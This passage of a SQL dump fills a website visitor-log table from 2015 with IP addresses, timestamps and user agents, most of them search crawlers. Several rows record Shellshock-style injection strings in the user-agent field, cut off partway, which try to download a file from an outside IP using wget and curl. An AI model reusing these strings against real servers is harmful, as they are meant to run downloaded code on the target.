Safari/600.1.4'),(1001,'180.76.15.7','2015-08-29','00:55:05','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1002,'180.76.15.28','2015-08-29','00:56:26','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1003,'180.76.15.13','2015-08-29','01:47:49','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1004,'180.76.15.137','2015-08-29','01:48:51','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1005,'119.114.213.35','2015-08-29','02:26:42','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1006,'42.87.208.47','2015-08-29','02:36:13','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1007,'218.24.216.181','2015-08-29','02:39:22','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1008,'157.55.39.166','2015-08-29','03:14:00','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(1009,'52.69.143.246','2015-08-29','03:15:06','http://www.hugedomains.com/domain_profile.cfm?d=bobbyortiz&e=com','Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:20.0) Gecko/20100101 Firefox/20.0'),(1010,'180.76.15.158','2015-08-29','05:12:35','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1011,'180.76.15.25','2015-08-29','05:13:48','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1012,'112.221.70.75','2015-08-29','05:17:23','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36'),(1013,'180.76.15.22','2015-08-29','05:48:50','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1014,'180.76.15.154','2015-08-29','07:50:48','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1015,'180.76.15.135','2015-08-29','07:51:53','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1016,'180.76.15.163','2015-08-29','08:54:23','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1017,'180.76.15.151','2015-08-29','08:55:31','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1018,'180.76.15.159','2015-08-29','10:51:30','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1019,'180.76.15.162','2015-08-29','11:41:49','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1020,'180.76.15.142','2015-08-29','11:42:31','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1021,'180.76.15.17','2015-08-29','12:58:48','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1022,'180.76.15.32','2015-08-29','13:00:17','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1023,'180.76.15.16','2015-08-29','15:00:19','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1024,'112.221.70.78','2015-08-29','15:06:20','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36'),(1025,'180.76.15.147','2015-08-29','15:16:03','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1026,'180.76.15.160','2015-08-29','15:16:45','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1027,'180.76.15.156','2015-08-29','16:53:24','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1028,'180.76.15.134','2015-08-29','17:44:24','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1029,'180.76.15.146','2015-08-29','18:58:43','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1030,'180.76.15.31','2015-08-29','18:59:53','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1031,'113.229.244.9','2015-08-29','19:14:11','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1032,'180.76.15.139','2015-08-29','19:44:17','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1033,'180.76.15.12','2015-08-29','19:45:06','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1034,'180.76.15.33','2015-08-29','20:54:12','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1035,'180.76.15.149','2015-08-29','21:48:19','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1036,'180.76.15.5','2015-08-29','22:51:10','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1037,'180.76.15.148','2015-08-29','22:52:17','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1038,'180.76.15.24','2015-08-29','23:39:33','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1039,'180.76.15.8','2015-08-29','23:40:14','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1040,'180.76.15.159','2015-08-30','00:57:23','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1041,'180.76.15.154','2015-08-30','00:58:36','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1042,'180.76.15.163','2015-08-30','01:49:59','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1043,'180.76.15.134','2015-08-30','01:51:04','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1044,'36.226.246.60','2015-08-30','03:09:08','',''),(1045,'180.76.15.11','2015-08-30','03:27:10','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1046,'180.76.15.12','2015-08-30','03:28:15','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1047,'180.76.15.34','2015-08-30','04:02:22','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1048,'180.76.15.140','2015-08-30','04:03:14','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1049,'60.23.69.190','2015-08-30','04:11:43','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1050,'50.203.105.238','2015-08-30','04:30:52','','() { :;};/usr/bin/perl -e \'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://46.38.251.16/favicon.icon;curl http://46.38.251.16/favicon.icon;GET http://46.38.251.16/favicon.icon;lwp-download http://46.38.251.16/favicon.icon;lynx http:/'),(1051,'180.76.15.10','2015-08-30','05:05:26','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1052,'180.76.15.141','2015-08-30','05:06:16','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1053,'180.76.15.29','2015-08-30','05:50:12','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1054,'113.229.198.141','2015-08-30','06:34:14','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1055,'180.76.15.150','2015-08-30','06:50:15','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1056,'180.76.15.7','2015-08-30','06:51:02','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1057,'111.248.60.224','2015-08-30','06:56:19','',''),(1058,'213.137.2.230','2015-08-30','07:04:55','','() { :;};/usr/bin/perl -e \'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://46.38.251.16/favicon.icon;curl http://46.38.251.16/favicon.icon;GET http://46.38.251.16/favicon.icon;lwp-download http://46.38.251.16/favicon.icon;lynx http:/'),(1059,'180.76.15.153','2015-08-30','07:43:16','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1060,'180.76.15.156','2015-08-30','07:44:03','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1061,'111.248.61.197','2015-08-30','07:56:11','',''),(1062,'180.76.15.20','2015-08-30','08:53:54','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1063,'113.229.242.230','2015-08-30','09:17:25','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1064,'180.76.15.160','2015-08-30','10:10:25','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1065,'180.76.15.158','2015-08-30','10:51:59','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1066,'180.76.15.22','2015-08-30','10:53:10','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1067,'180.76.15.162','2015-08-30','11:45:19','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1068,'180.76.15.144','2015-08-30','11:46:04','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1069,'180.76.15.9','2015-08-30','12:55:33','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1070,'180.76.15.26','2015-08-30','13:48:15','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1071,'202.83.16.236','2015-08-30','14:56:18','','() { :;};/usr/bin/perl -e \'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://46.38.251.16/favicon.icon;curl http://46.38.251.16/favicon.icon;GET http://46.38.251.16/favicon.icon;lwp-download http://46.38.251.16/favicon.icon;lynx http:/'),(1072,'180.76.15.157','2015-08-30','15:50:46','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1073,'180.76.15.21','2015-08-30','15:51:44','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1074,'207.46.13.37','2015-08-30','16:37:37','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(1075,'64.47.136.150','2015-08-30','16:57:08','','() { :;};/usr/bin/perl -e \'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://46.38.251.16/favicon.icon;curl http://46.38.251.16/favicon.icon;GET http://46.38.251.16/favicon.icon;lwp-download http://46.38.251.16/favicon.icon;lynx http:/'),(1076,'42.120.142.220','2015-08-30','17:24:05','','Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)'),(1077,'190.210.30.237','2015-08-30','18:19:38','','() { :;};/usr/bin/perl -e \'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://46.38.251.16/favicon.icon;curl http://46.38.251.16/favicon.icon;GET http://46.38.251.16/favicon.icon;lwp-download http://46.38.251.16/favicon.icon;lynx http:/'),(1078,'178.63.13.15','2015-08-30','18:20:02','','Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)'),(1079,'180.76.15.142','2015-08-30','18:55:28','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1080,'218.24.216.23','2015-08-30','19:23:44','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1081,'42.87.209.157','2015-08-30','19:28:46','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1082,'180.76.15.19','2015-08-30','19:47:01','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1083,'36.229.232.189','2015-08-30','20:33:05','',''),(1084,'42.87.222.120','2015-08-30','20:42:13','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1085,'180.76.15.13','2015-08-30','20:55:05','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1086,'111.248.118.7','2015-08-30','21:21:20','',''),(1087,'180.76.15.148','2015-08-30','21:52:23','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1088,'78.128.92.194','2015-08-30','22:12:42','','Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1'),(1089,'123.212.42.241','2015-08-30','22:16:06','','() { :;};/usr/bin/perl -e \'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://46.38.251.16/favicon.icon;curl http://46.38.251.16/favicon.icon;GET http://46.38.251.16/favicon.icon;lwp-download http://46.38.251.16/favicon.icon;lynx http:/'),(1090,'180.76.15.31','2015-08-30','22:39:07','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1091,'180.76.15.15','2015-08-30','22:39:50','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1092,'180.76.15.137','2015-08-30','23:38:18','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1093,'180.76.15.149','2015-08-30','23:38:58','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1094,'180.76.15.162','2015-08-31','00:57:30','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1095,'180.76.15.31','2015-08-31','00:58:44','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1096,'180.76.15.6','2015-08-31','01:04:18','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1097,'180.76.15.154','2015-08-31','01:04:18','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1098,'180.76.15.159','2015-08-31','01:41:21','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1099,'180.76.15.151','2015-08-31','01:42:07','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1100,'182.118.45.224','2015-08-31','03:32:45','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(1101,'180.76.15.27','2015-08-31','05:10:32','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1102,'180.76.15.155','2015-08-31','05:11:44','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1103,'180.76.15.15','2015-08-31','05:50:06','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1104,'42.58.64.20','2015-08-31','06:43:22','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1105,'180.76.15.34','2015-08-31','06:55:53','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1106,'180.76.15.139','2015-08-31','07:44:32','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1107,'180.76.15.163','2015-08-31','07:45:16','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1108,'218.24.223.228','2015-08-31','08:30:57','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1109,'222.85.127.205','2015-08-31','08:46:11','','() { :;};/usr/bin/perl -e \'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://46.38.251.16/favicon.icon;curl http://46.38.251.16/favicon.icon;GET http://46.38.251.16/favicon.icon;lwp-download http://46.38.251.16/favicon.icon;lynx http:/'),(1110,'180.76.15.156','2015-08-31','08:50:32','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1111,'180.76.15.135','2015-08-31','08:51:39','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1112,'182.118.55.114','2015-08-31','08:55:38','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(1113,'180.76.15.148','2015-08-31','09:46:47','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1114,'180.76.15.144','2015-08-31','09:47:38','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1115,'157.55.39.76','2015-08-31','10:38:01','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(1116,'180.76.15.11','2015-08-31','10:40:06','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1117,'180.76.15.29','2015-08-31','10:40:49','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1118,'180.76.15.140','2015-08-31','10:43:52','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1119,'180.76.15.153','2015-08-31','11:59:27','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1120,'180.76.15.10','2015-08-31','12:00:37','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1121,'180.76.15.137','2015-08-31','12:45:34','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1122,'180.76.15.147','2015-08-31','13:46:09','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1123,'180.76.15.25','2015-08-31','13:47:06','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1124,'180.76.15.157','2015-08-31','15:14:39','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1125,'180.76.15.24','2015-08-31','15:53:47','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1126,'195.78.211.16','2015-08-31','16:27:42','',''),(1127,'180.76.15.14','2015-08-31','16:56:01','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1128,'61.176.206.144','2015-08-31','17:06:55','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1129,'113.229.201.49','2015-08-31','17:08:26','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1130,'61.176.206.106','2015-08-31','17:24:55','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1131,'42.120.142.220','2015-08-31','17:30:44','','Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)'),(1132,'180.76.15.12','2015-08-31','18:57:44','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1133,'111.248.99.164','2015-08-31','19:27:46','',''),(1134,'180.76.15.28','2015-08-31','19:51:25','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1135,'180.76.15.160','2015-08-31','20:00:52','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1136,'157.55.39.159','2015-08-31','20:01:40','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(1137,'207.46.13.113','2015-08-31','20:32:55','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(1138,'180.76.15.33','2015-08-31','21:08:11','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1139,'207.46.13.57','2015-08-31','21:21:02','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(1140,'180.76.15.5','2015-08-31','22:08:50','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1141,'180.76.15.134','2015-08-31','23:56:50','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1142,'207.46.13.113','2015-09-01','00:59:31','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(1143,'180.76.15.137','2015-09-01','01:06:38','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1144,'180.76.15.32','2015-09-01','01:08:02','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1145,'180.76.15.151','2015-09-01','02:09:03','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1146,'180.76.15.161','2015-09-01','02:09:50','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1147,'157.55.39.171','2015-09-01','02:46:29','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(1148,'111.248.98.21','2015-09-01','02:46:41','',''),(1149,'182.118.45.224','2015-09-01','03:13:51','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(1150,'142.54.187.42','2015-09-01','03:17:56','','Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)'),(1151,'157.55.39.123','2015-09-01','04:25:06','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(1152,'180.76.15.145','2015-09-01','05:33:28','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1153,'180.76.15.8','2015-09-01','05:33:28','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1154,'113.229.246.48','2015-09-01','05:51:17','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1155,'157.55.39.33','2015-09-01','05:53:06','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(1156,'180.76.15.136','2015-09-01','06:23:04','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1157,'182.118.55.128','2015-09-01','06:34:29','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(1158,'180.76.15.163','2015-09-01','06:58:13','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1159,'180.76.15.162','2015-09-01','07:09:49','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1160,'180.76.15.158','2015-09-01','07:10:54','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1161,'180.76.15.139','2015-09-01','08:08:19','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1162,'180.76.15.148','2015-09-01','08:09:28','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1163,'180.76.15.153','2015-09-01','09:04:34','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1164,'180.76.15.13','2015-09-01','10:04:46','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1165,'180.76.15.18','2015-09-01','10:54:11','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1166,'180.76.15.146','2015-09-01','10:54:59','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1167,'180.76.15.23','2015-09-01','11:14:49','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1168,'180.76.15.138','2015-09-01','11:53:56','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1169,'180.76.15.10','2015-09-01','11:54:50','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1170,'180.76.15.34','2015-09-01','14:12:07','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1171,'180.76.15.160','2015-09-01','14:12:45','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1172,'175.223.15.177','2015-09-01','14:24:23','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/534.53.11 (KHTML, like Gecko) Version/5.1.3 Safari/534.53.10'),(1173,'157.55.39.220','2015-09-01','14:27:48','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(1174,'207.46.13.88','2015-09-01','15:42:26','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(1175,'42.156.250.118','2015-09-01','15:53:14','','Mozilla/4.0 (compatible; MSIE 4.01; Windows 98)'),(1176,'113.229.206.170','2015-09-01','16:55:41','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1177,'60.23.70.217','2015-09-01','16:56:29','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1178,'113.229.244.122','2015-09-01','17:00:48','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1179,'180.76.15.26','2015-09-01','17:24:30','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1180,'180.76.15.20','2015-09-01','17:25:37','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1181,'111.248.102.91','2015-09-01','17:30:08','',''),(1182,'180.76.15.143','2015-09-01','18:16:09','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1183,'180.76.15.6','2015-09-01','19:05:43','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1184,'61.231.6.242','2015-09-01','19:12:34','',''),(1185,'5.104.175.234','2015-09-01','19:43:50','','Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1'),(1186,'180.76.15.149','2015-09-01','20:00:18','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1187,'180.76.15.22','2015-09-01','21:11:48','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1188,'180.76.15.141','2015-09-01','22:12:02','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1189,'180.76.15.17','2015-09-01','22:58:42','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1190,'42.87.223.37','2015-09-01','23:44:18','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(1191,'180.76.15.134','2015-09-02','00:07:09','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1192,'180.76.15.25','2015-09-02','00:08:37','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1193,'141.212.121.152','2015-09-02','00:37:09','','Mozilla/5.0 zgrab/0.x'),(1194,'180.76.15.22','2015-09-02','01:06:41','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1195,'180.76.15.147','2015-09-02','01:07:58','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1196,'61.231.7.9','2015-09-02','01:38:49','',''),(1197,'180.76.15.138','2015-09-02','01:49:01','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1198,'180.76.15.16','2015-09-02','01:50:03','','Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)'),(1199,'185.35.62.11','2015-09-02','02:19:35','',''),(1200,'209.126.230.72','2015-09-02','02:51:25','','masscan/1.0 (https://github.com/robertdavidgraham/masscan)'),(1201,'180.76.15.161','2015-09-02','03:18:37','','Mozilla/5.0 (compatible; Baiduspider/2.0; 